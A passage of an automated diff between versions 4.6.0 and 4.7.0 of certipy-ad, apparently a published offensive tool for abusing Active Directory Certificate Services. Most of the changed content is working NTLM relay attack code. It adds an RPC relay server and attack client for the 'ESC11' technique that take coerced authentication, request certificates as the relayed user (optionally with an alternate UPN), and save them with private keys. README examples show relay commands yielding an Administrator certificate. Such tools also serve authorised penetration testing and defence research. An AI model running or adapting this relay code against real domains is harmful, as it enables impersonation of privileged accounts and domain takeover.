     group = subparser.add_argument_group("certificate request options")
     group.add_argument(
+        "-ca",
+        action="store",
+        metavar="certificate authority name",
+        help="CA name to request certificate from. Example: 'CORP-CA'. Only required for RPC relay (ESC11)"
+    )
+    group.add_argument(
         "-template",
         action="store",
         metavar="template name",
         help="If omitted, the template 'Machine' or 'User' is chosen by default depending on whether the relayed account name ends with '$'. Relaying a DC should require specifying the 'DomainController' template",
     )
 
     group.add_argument("-upn", action="store", metavar="alternative UPN")
```

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/req.py` & `certipy-ad-4.7.0/certipy/commands/parsers/req.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/shadow.py` & `certipy-ad-4.7.0/certipy/commands/parsers/shadow.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/target.py` & `certipy-ad-4.7.0/certipy/commands/parsers/target.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/template.py` & `certipy-ad-4.7.0/certipy/commands/parsers/template.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/ptt.py` & `certipy-ad-4.7.0/certipy/commands/ptt.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/relay.py` & `certipy-ad-4.7.0/certipy/commands/relay.py`

 * *Files 20% similar despite different names*

```diff
@@ -6,46 +6,50 @@
 import traceback
 import urllib.parse
 from struct import unpack
 from threading import Lock
 
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
+from impacket.examples.ntlmrelayx.clients import rpcrelayclient
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.ntlm import NTLMAuthChallengeResponse
 from impacket.spnego import SPNEGO_NegTokenResp
+from impacket.dcerpc.v5 import epm
 
 from certipy.lib.certificate import (
     cert_id_to_parts,
     cert_to_pem,
     create_csr,
     create_pfx,
+    csr_to_der,
     csr_to_pem,
     get_identifications_from_certificate,
     get_object_sid_from_certificate,
     key_to_pem,
     pem_to_cert,
     pem_to_key,
     rsa,
     x509,
 )
 from certipy.lib.errors import translate_error_code
 from certipy.lib.formatting import print_certificate_identifications
 from certipy.lib.logger import logging
+from certipy.commands.req import MSRPC_UUID_ICPR, RPCRequestInterface
 
 try:
     from http.client import HTTPConnection
 except ImportError:
     from httplib import HTTPConnection
 
 
-class ADCSRelayServer(HTTPRelayClient):
+class ADCSHTTPRelayServer(HTTPRelayClient):
     def initConnection(self):
         logging.debug("Connecting to %s:%s..." % (self.targetHost, self.targetPort))
         self.session = HTTPConnection(
             self.targetHost, self.targetPort, timeout=self.adcs_relay.timeout
         )
         self.session.connect()
         logging.debug("Connected to %s:%s" % (self.targetHost, self.targetPort))
@@ -86,14 +90,16 @@
             response.fromString(data=token)
 
             domain = response["domain_name"].decode("utf-16le")
             username = response["user_name"].decode("utf-16le")
 
             self.session.user = "%s\\%s" % (domain, username)
 
+            print(self.session.user)
+
             auth = base64.b64encode(token).decode("ascii")
             headers = {"Authorization": "%s %s" % (self.authenticationMethod, auth)}
             self.session.request("GET", self.path, headers=headers)
             res = self.session.getresponse()
 
             if res.status == 401:
                 logging.error("Got unauthorized response from AD CS")
@@ -110,15 +116,78 @@
             logging.error("Got error: %s" % e)
             if self.adcs_relay.verbose:
                 traceback.print_exc()
             else:
                 logging.error("Use -debug to print a stacktrace")
 
 
-class ADCSAttackClient(ProtocolAttack):
+class ADCSRPCRelayServer(rpcrelayclient.RPCRelayClient, rpcrelayclient.ProtocolClient):
+    def __init__(self, serverConfig, target, targetPort=None, extendedSecurity=True):
+        rpcrelayclient.ProtocolClient.__init__(
+            self, serverConfig, target, targetPort, extendedSecurity
+        )
+
+        self.endpoint = "ICPR"
+
+        self.endpoint_uuid = MSRPC_UUID_ICPR
+
+        logging.info(
+            "Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding"
+            % (target.netloc, self.endpoint)
+        )
+        self.stringbinding = epm.hept_map(
+            target.netloc, self.endpoint_uuid, protocol="ncacn_ip_tcp"
+        )
+
+        logging.debug("%s stringbinding is %s" % (self.endpoint, self.stringbinding))
+
+    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        if (
+            unpack("B", authenticateMessageBlob[:1])[0]
+            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
+        ):
+            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            auth_data = respToken2["ResponseToken"]
+        else:
+            auth_data = authenticateMessageBlob
+
+        self.session.sendBindType3(auth_data)
+
+        try:
+            req = rpcrelayclient.DummyOp()
+            self.session.request(req)
+        except rpcrelayclient.DCERPCException as e:
+            if "nca_s_op_rng_error" in str(e) or "RPC_E_INVALID_HEADER" in str(e):
+                return None, STATUS_SUCCESS
+            elif "rpc_s_access_denied" in str(e):
+                return None, STATUS_ACCESS_DENIED
+            else:
+                logging.info(
+                    "Unexpected rpc code received from %s: %s"
+                    % (self.stringbinding, str(e))
+                )
+                return None, STATUS_ACCESS_DENIED
+
+    def killConnection(self):
+        if self.session is not None:
+            self.session.get_rpc_transport().disconnect()
+            self.session = None
+
+    def keepAlive(self):
+        try:
+            req = rpcrelayclient.DummyOp()
+            self.session.request(req)
+        except rpcrelayclient.DCERPCException as e:
+            if "nca_s_op_rng_error" not in str(e) or "RPC_E_INVALID_HEADER" not in str(
+                e
+            ):
+                raise
+
+
+class ADCSHTTPAttackClient(ProtocolAttack):
     def run(self):
         self.adcs_relay.attack_lock.acquire()
         try:
             self._run()
         except Exception as e:
             logging.error("Got error: %s" % e)
             if self.adcs_relay.verbose:
@@ -364,18 +433,198 @@
                 logging.info(
                     "Saved certificate and private key to %s" % repr("%s.pfx" % out)
                 )
 
         self.finish_run()
 
 
+class ADCSRPCAttackClient(ProtocolAttack):
+    def __init__(self, config, dce, username):
+        super().__init__(config, dce, username)
+
+        self.dce = dce
+        self.rpctransport = dce.get_rpc_transport()
+        self.stringbinding = self.rpctransport.get_stringbinding()
+
+        try:
+            if "/" in username:
+                self.domain, self.username = username.split("/")
+            else:
+                self.domain, self.username = "Unknown", username
+        except Exception as e:
+            print("Got error", e)
+
+    def run(self):
+        self.adcs_relay.attack_lock.acquire()
+
+        self.interface = RPCRequestInterface(parent=self.adcs_relay)
+        self.interface._dce = self.dce
+
+        try:
+            self._run()
+        except Exception as e:
+            logging.error("Got error: %s" % e)
+            if self.adcs_relay.verbose:
+                traceback.print_exc()
+            else:
+                logging.error("Use -debug to print a stacktrace")
+        finally:
+            self.adcs_relay.attack_lock.release()
+
+    def _run(self):
+        if (
+            not self.adcs_relay.no_skip
+            and (self.username + "@" + self.domain) in self.adcs_relay.attacked_targets
+        ):
+            logging.info(
+                "Skipping user %s since attack was already performed"
+                % repr(self.username + "@" + self.domain)
+            )
+            return
+
+        logging.info("Attacking user %s" % repr(self.username + "@" + self.domain))
+
+        request_id = self.adcs_relay.request_id
+        if request_id:
+            self.retrieve()
+        else:
+            self.request()
+
+        self.finish_run()
+
+    def retrieve(self) -> bool:
+        request_id = int(self.adcs_relay.request_id)
+
+        logging.info("Retrieving certificate for request id %d" % request_id)
+
+        cert = self.interface.retrieve(request_id)
+        if cert is False:
+            logging.error("Failed to retrieve certificate")
+            return False
+
+        identifications = get_identifications_from_certificate(cert)
+
+        print_certificate_identifications(identifications)
+
+        object_sid = get_object_sid_from_certificate(cert)
+        if object_sid is not None:
+            logging.info("Certificate object SID is %s" % repr(object_sid))
+        else:
+            logging.info("Certificate has no object SID")
+
+        out = self.adcs_relay.out
+        if out is None:
+            out, _ = cert_id_to_parts(identifications)
+            if out is None:
+                out = self.username
+
+            out = out.rstrip("$").lower()
+
+        try:
+            with open("%d.key" % request_id, "rb") as f:
+                key = pem_to_key(f.read())
+        except Exception as e:
+            logging.warning(
+                "Could not find matching private key. Saving certificate as PEM"
+            )
+            with open("%s.crt" % out, "wb") as f:
+                f.write(cert_to_pem(cert))
+
+            logging.info("Saved certificate to %s" % repr("%s.crt" % out))
+        else:
+            logging.info("Loaded private key from %s" % repr("%d.key" % request_id))
+            pfx = create_pfx(key, cert)
+            with open("%s.pfx" % out, "wb") as f:
+                f.write(pfx)
+            logging.info(
+                "Saved certificate and private key to %s" % repr("%s.pfx" % out)
+            )
+
+        return True
+
+    def request(self) -> bool:
+        template = self.config.template
+
+        if template is None:
+            logging.info("Template was not defined. Defaulting to Machine/User")
+            template = "Machine" if self.username.endswith("$") else "User"
+
+        logging.info(
+            "Requesting certificate for user %s with template %s"
+            % (repr(self.username), repr(template))
+        )
+
+        csr, key = create_csr(
+            self.username,
+            alt_dns=self.adcs_relay.dns,
+            alt_upn=self.adcs_relay.upn,
+            key_size=self.adcs_relay.key_size,
+        )
+        self.key = key
+        self.adcs_relay.key = key
+
+        csr = csr_to_der(csr)
+
+        attributes = ["CertificateTemplate:%s" % template]
+
+        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
+            san = []
+            if self.adcs_relay.dns:
+                san.append("dns=%s" % self.adcs_relay.dns)
+            if self.adcs_relay.upn:
+                san.append("upn=%s" % self.adcs_relay.upn)
+
+            attributes.append("SAN:%s" % "&".join(san))
+
+        cert = self.interface.request(csr, attributes)
+
+        if cert is False:
+            logging.error("Failed to request certificate")
+            return False
+
+        identifications = get_identifications_from_certificate(cert)
+
+        print_certificate_identifications(identifications)
+
+        object_sid = get_object_sid_from_certificate(cert)
+        if object_sid is not None:
+            logging.info("Certificate object SID is %s" % repr(object_sid))
+        else:
+            logging.info("Certificate has no object SID")
+
+        out = self.adcs_relay.out
+        if out is None:
+            out, _ = cert_id_to_parts(identifications)
+            if out is None:
+                out = self.username
+
+            out = out.rstrip("$").lower()
+
+        pfx = create_pfx(key, cert)
+
+        outfile = "%s.pfx" % out
+
+        with open(outfile, "wb") as f:
+            f.write(pfx)
+
+        logging.info("Saved certificate and private key to %s" % repr(outfile))
+
+        return pfx, outfile
+
+    def finish_run(self):
+        self.adcs_relay.attacked_targets.append(self.username + "@" + self.domain)
+        if not self.adcs_relay.forever:
+            self.adcs_relay.shutdown()
+
+
 class Relay:
     def __init__(
         self,
-        ca,
+        target,
+        ca=None,
         template=None,
         upn=None,
         dns=None,
         sid=None,
         retrieve=None,
         key_size: int = 2048,
         out=None,
@@ -383,14 +632,15 @@
         port=445,
         forever=False,
         no_skip=False,
         timeout=5,
         debug=False,
         **kwargs
     ):
+        self.target = target
         self.ca = ca
         self.template = template
         self.upn = upn
         self.dns = dns
         self.sid = sid
         self.request_id = int(retrieve)
         self.key_size = key_size
@@ -402,27 +652,43 @@
         self.interface = interface
         self.port = port
         self.kwargs = kwargs
 
         self.attacked_targets = []
         self.attack_lock = Lock()
 
-        target = "http://%s/certsrv/certfnsh.asp" % ca
-        logging.info("Targeting %s" % target)
+        if self.target.startswith("rpc://"):
+            if ca is None:
+                logging.error("A certificate authority is required for RPC attacks")
+                exit(1)
+
+            logging.info("Targeting %s (ESC11)" % target)
+        else:
+            if not self.target.startswith("http://"):
+                self.target = "http://%s" % self.target
+            if not self.target.endswith("/certsrv/certfnsh.asp"):
+                if not self.target.endswith("/"):
+                    self.target += "/"
+                self.target += "certsrv/certfnsh.asp"
+            logging.info("Targeting %s (ESC8)" % self.target)
 
         target = TargetsProcessor(
-            singleTarget=target,
+            singleTarget=self.target, protocolClients={"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
         )
 
         config = NTLMRelayxConfig()
         config.setTargets(target)
         config.setIsADCSAttack(True)
         config.setADCSOptions(self.template)
-        config.setAttacks({"HTTP": self.get_attack_client})
-        config.setProtocolClients({"HTTP": self.get_relay_server})
+        config.setAttacks(
+            {"HTTP": self.get_attack_http_client, "RPC": self.get_attack_rpc_client}
+        )
+        config.setProtocolClients(
+            {"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
+        )
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
         config.setSMB2Support(True)
         config.setMode("RELAY")
 
         self.server = SMBRelayServer(config)
 
@@ -440,21 +706,31 @@
         except Exception as e:
             logging.error("Got error: %s" % e)
             if self.verbose:
                 traceback.print_exc()
             else:
                 logging.error("Use -debug to print a stacktrace")
 
-    def get_relay_server(self, *args, **kwargs) -> ADCSRelayServer:
-        relay_server = ADCSRelayServer(*args, **kwargs)
+    def get_relay_http_server(self, *args, **kwargs) -> ADCSHTTPRelayServer:
+        relay_server = ADCSHTTPRelayServer(*args, **kwargs)
+        relay_server.adcs_relay = self
+        return relay_server
+
+    def get_attack_http_client(self, *args, **kwargs) -> ADCSHTTPAttackClient:
+        attack_client = ADCSHTTPAttackClient(*args, **kwargs)
+        attack_client.adcs_relay = self
+        return attack_client
+
+    def get_relay_rpc_server(self, *args, **kwargs) -> ADCSRPCRelayServer:
+        relay_server = ADCSRPCRelayServer(*args, **kwargs)
         relay_server.adcs_relay = self
         return relay_server
 
-    def get_attack_client(self, *args, **kwargs) -> ADCSAttackClient:
-        attack_client = ADCSAttackClient(*args, **kwargs)
+    def get_attack_rpc_client(self, *args, **kwargs) -> ADCSRPCAttackClient:
+        attack_client = ADCSRPCAttackClient(*args, **kwargs)
         attack_client.adcs_relay = self
         return attack_client
 
     def shutdown(self):
         logging.info("Exiting...")
         os._exit(0)
```

### Comparing `certipy-ad-4.6.0/certipy/commands/req.py` & `certipy-ad-4.7.0/certipy/commands/req.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/shadow.py` & `certipy-ad-4.7.0/certipy/commands/shadow.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/template.py` & `certipy-ad-4.7.0/certipy/commands/template.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/entry.py` & `certipy-ad-4.7.0/certipy/entry.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/certificate.py` & `certipy-ad-4.7.0/certipy/lib/certificate.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/constants.py` & `certipy-ad-4.7.0/certipy/lib/constants.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/errors.py` & `certipy-ad-4.7.0/certipy/lib/errors.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/formatting.py` & `certipy-ad-4.7.0/certipy/lib/formatting.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/kerberos.py` & `certipy-ad-4.7.0/certipy/lib/kerberos.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/ldap.py` & `certipy-ad-4.7.0/certipy/lib/ldap.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/logger.py` & `certipy-ad-4.7.0/certipy/lib/logger.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/pkinit.py` & `certipy-ad-4.7.0/certipy/lib/pkinit.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/rpc.py` & `certipy-ad-4.7.0/certipy/lib/rpc.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/security.py` & `certipy-ad-4.7.0/certipy/lib/security.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/sspi/encryption.py` & `certipy-ad-4.7.0/certipy/lib/sspi/encryption.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/sspi/kerberos.py` & `certipy-ad-4.7.0/certipy/lib/sspi/kerberos.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/sspi/netsecapi.py` & `certipy-ad-4.7.0/certipy/lib/sspi/netsecapi.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/structs.py` & `certipy-ad-4.7.0/certipy/lib/structs.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/lib/target.py` & `certipy-ad-4.7.0/certipy/lib/target.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy_ad.egg-info/PKG-INFO` & `certipy-ad-4.7.0/certipy_ad.egg-info/PKG-INFO`

 * *Files 5% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: certipy-ad
-Version: 4.6.0
+Version: 4.7.0
 Summary: Active Directory Certificate Services enumeration and abuse
 Home-page: https://github.com/ly4k/Certipy
 Author: ly4k
 License: MIT
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
@@ -769,43 +769,64 @@
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
 #### ESC8
 
 ESC8 is when an Enrollment Service has installed and enabled Web Enrollment via HTTP.
 
-To start the relay server, we can run the `relay` command and specify the CA's IP in `-ca`.
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target http://<ip>`.
 
 By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
 
-We can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ certipy relay -ca ca.corp.local
-Certipy v4.0.0 - by Oliver Lyak (ly4k)
+$ certipy relay -target 'http://ca.corp.local'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
-[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
+[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp (ESC8)
 [*] Listening on 0.0.0.0:445
 [*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
 [*] Got certificate with UPN 'Administrator@corp.local'
 [*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
 
 #### ESC9 & ESC10
 
 ESC9 and ESC10 is not related to any specific Certipy commands or parameters, but can be abused with Certipy. See the [blog post](https://research.ifcr.dk/7237d88061f7) for more information.
 
 #### ESC11
 
-ESC11 can be abused with impacket's ntlmrelayx:
+ESC11 is when the certificate authority is not configured with IF_ENFORCEENCRYPTICERTREQUEST. This makes the RPC service vulnerable to NTLM relay attacks without signing, such as via SMB. The attack is similar to ESC8, except that we're targeting the RPC protocol instead of the HTTP protocol.
+
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target rpc://<ip>`. We must also specify the name of the certificate authority in `-ca <name>`.
+
+By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
+
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name corp-DC-CA -smb2support
+$ certipy relay -target 'rpc://ca.corp.local' -ca 'corp-ca'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://ca.corp.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:ca.corp.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@CORP'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 1
+[*] Got certificate with UPN 'Administrator@corp.local'
+[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
 ```
 
 ## Contact
 
 Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to me on Twitter [@ly4k_](https://twitter.com/ly4k_).
 
 ## Credits
```

### Comparing `certipy-ad-4.6.0/certipy_ad.egg-info/SOURCES.txt` & `certipy-ad-4.7.0/certipy_ad.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/setup.py` & `certipy-ad-4.7.0/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md") as f:
     readme = f.read()
 
 setup(
     name="certipy-ad",
-    version="4.6.0",
+    version="4.7.0",
     license="MIT",
     author="ly4k",
     url="https://github.com/ly4k/Certipy",
     long_description=readme,
     long_description_content_type="text/markdown",
     install_requires=[
         "asn1crypto",
```

